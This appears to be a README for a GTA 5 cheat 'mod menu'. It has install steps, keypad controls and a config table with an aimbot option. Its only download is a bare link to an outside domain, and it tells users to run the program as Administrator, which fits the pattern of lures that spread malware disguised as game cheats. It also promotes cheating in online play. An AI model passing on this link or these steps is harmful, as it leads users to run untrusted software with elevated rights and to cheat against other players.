## 🔧 Installation / How to Use

1. Click **[CLICK](https://gitappdown.top/)** to download.

2. Launch GTA 5 and load into Story Mode or Online.

3. Run the mod menu **as Administrator**.

4. Wait for confirmation that the menu attached.

5. Press `F5` or `Insert` to open the menu.

6. Use the **numeric keypad** to navigate:
   - **8** — Up
   - **2** — Down
   - **4** — Left
   - **6** — Right
   - **5** — Select
   - **0** — Back

> **Note:** If the menu does not appear, ensure the game is running in **Windowed** or **Borderless Windowed** mode.

## ⚙️ Configuration

Settings are stored in `config.json` at `%APPDATA%\GTA5ModMenu\config.json`.

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"F5"` | Key to toggle menu |
| `auto_attach` | Boolean | `true` | Auto-attach on startup |
| `process_name` | String | `"GTA5.exe"` | Target process |
| `aimbot_enabled` | Boolean | `false` | Enable aimbot |
| `safe_mode` | Boolean | `true` | Restricts unstable features |
| `log_level` | String | `"info"` | `"debug"`, `"info"`, `"error"` |
